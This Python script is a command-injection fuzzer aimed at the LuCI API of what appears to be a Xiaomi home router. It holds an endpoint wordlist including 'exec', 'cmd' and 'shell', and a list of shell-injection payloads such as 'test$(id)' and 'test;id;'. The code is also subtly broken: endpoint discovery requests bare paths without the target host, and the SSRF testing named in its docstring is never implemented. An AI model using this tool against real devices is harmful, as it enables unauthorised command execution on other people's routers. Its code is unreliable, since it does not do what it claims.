#!/usr/bin/env python3
"""
fuzz_api.py — Standalone API fuzzing script.
Usage: python fuzz_api.py <target> <token>

Features:
- Automatic endpoint discovery from wordlists
- Parameter injection testing
- SSRF payload testing via Host header
- Response analysis (code, length, patterns)
"""

import requests
import sys
import json
import time
from urllib.parse import urljoin

# ═══ CONFIGURATION ═══
API_WORDS = [
    'firewall','fw','iptables','ipset','mipctl','url_fw','antiy',
    'blacklist','whitelist','macfilter','port_forward','dmz','upnp',
    'qos','traffic','nat','security','safe','protect','defend','attack',
    'guest','wifi_acl','access_control','timelimit','schedule',
    'filter','rule','policy','profile','device_list','device_control',
    'parent_control','family','class','appclass','web_filter',
    'keyword','block','lanlan','lan_lan','web_access','wan_access',
    'speed','bandwidth','throttle','shape','limit','restrict',
    'download','upload','proxy','tunnel','request','fetch',
    'exec','cmd','shell','debug','test','status','info',
]

INJECTION_PAYLOADS = [
    ('test$(id)', 'dollar-paren'),
    ('test`id`', 'backtick'),  
    ('test;id;', 'semicolon'),
    ('test|id|', 'pipe'),
    ('test\\";id;\\"', 'quote-escape'),
    ('test\nid', 'newline'),
    ('test&id&', 'ampersand'),
]

# ═══ MAIN ═══

def discover_endpoints(base_url, token=None):
    """Discover API endpoints by fuzzing word lists."""
    prefixes = [
        '/cgi-bin/luci/api/misystem/',
        '/cgi-bin/luci/api/xqsystem/',
        '/cgi-bin/luci/api/xqnetwork/',
    ]
    if token:
        prefixes = [p.replace('/api/', f'/;stok={token}/api/') for p in prefixes]
    
    hits = {}
    for prefix in prefixes:
        for word in API_WORDS:
            url = f"{prefix}{word}"
            try:
                r = requests.get(url, timeout=2)
                if r.status_code == 200 and 'No page is registered' not in r.text:
                    hits[url] = r.text[:100]
            except:
                pass
    return hits

def test_injection(base_url, token, endpoints):
    """Test command injection on discovered endpoints."""
    results = []
    for ep in endpoints:
        for payload, label in INJECTION_PAYLOADS:
            try:
                r = requests.post(ep, data={'data': payload}, timeout=3)
                code = r.json().get('code', -1)
                if code != 401:  # Not auth error
                    results.append((ep, label, code, r.text[:100]))
            except:
                pass
    return results

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.31.1'
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    base_url = f"http://{target}/cgi-bin/luci/api/"
    
    print(f"[*] Fuzzing {target}...")
    print(f"[*] Token: {'present' if token else 'none'}")
    print()
    
    # Discovery
    endpoints = discover_endpoints(base_url, token)
    print(f"[+] Found {len(endpoints)} endpoints:")
    for url, preview in endpoints.items():
        print(f"    {url} → {preview}")
    
    # Injection
    if endpoints:
        results = test_injection(base_url, token, list(endpoints.keys()))
        if results:
            print(f"\n[!] Potential injection hits:")
            for ep, label, code, resp in results:
                print(f"    [{code}] {label} @ {ep} → {resp}")

if __name__ == '__main__':
    main()
